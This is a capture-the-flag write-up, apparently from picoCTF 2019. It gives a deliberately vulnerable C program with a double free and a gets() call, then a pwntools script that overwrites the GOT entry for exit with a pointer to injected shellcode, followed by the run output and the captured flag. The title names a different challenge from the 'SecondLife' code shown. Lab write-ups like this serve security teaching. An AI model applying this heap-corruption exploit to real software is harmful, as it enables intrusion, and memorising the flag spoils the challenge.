# L1im1tL355
Binary Exploitation, 400 points

## Description:
> Just pwn this program and get a flag.

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#define FLAG_BUFFER 200
#define LINE_BUFFER_SIZE 20

void win() {
  char buf[FLAG_BUFFER];
  FILE *f = fopen("flag.txt","r");
  fgets(buf,FLAG_BUFFER,f);
  fprintf(stdout,"%s\n",buf);
  fflush(stdout);
}

int main(int argc, char *argv[])
{
   //This is rather an artificial pieace of code taken from Secure Coding in c by Robert C. Seacord 
   char *first, *second, *third, *fourth;
   char *fifth, *sixth, *seventh;
   first=malloc(256);
   printf("Oops! a new developer copy pasted and printed an address as a decimal...\n");
   printf("%d\n",first);
   fgets(first, LINE_BUFFER_SIZE, stdin);
   second=malloc(256);
   third=malloc(256);
   fourth=malloc(256);
   free(first);
   free(third);
   fifth=malloc(128);
   free(first);
   sixth=malloc(256);
   puts("You should enter the got and the shellcode address in some specific manner... an overflow will not be very useful...");
   gets(sixth);
   seventh=malloc(256);
   exit(0);
}


```


## Solution:

(Initial commit with just the script)

```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/secondlife_0_1d09c6c834e9512daebaf9e25feedd53/vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

import os

#context.log_level = "DEBUG"

if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))

io = start()

io.recvuntil("Oops! a new developer copy pasted and printed an address as a decimal...\n")
address = int(io.recvline())
io.sendline("a")

payload = p32(exe.got["exit"] - 12) + p32(address + 8) + asm('push {}; ret;'.format(hex(exe.symbols["win"])))
io.sendlineafter("You should enter the got and the shellcode address in some specific manner... an overflow will not be very useful...", payload)
print io.recvall()
```

Output:
```console
root@kali:/media/sf_CTFs/pico/SecondLife# python exploit.py
[*] '/media/sf_CTFs/pico/SecondLife/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] dvdalt@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.peapk9ixJG'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/secondlife_0_1d09c6c834e9512daebaf9e25feedd53'
[+] Starting remote process '/problems/secondlife_0_1d09c6c834e9512daebaf9e25feedd53/vuln' on 2019shell1.picoctf.com: pid 1411713
[+] Receiving all data: Done (32B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1411713)

picoCTF{HeapHeapFlag_8342a39b}
```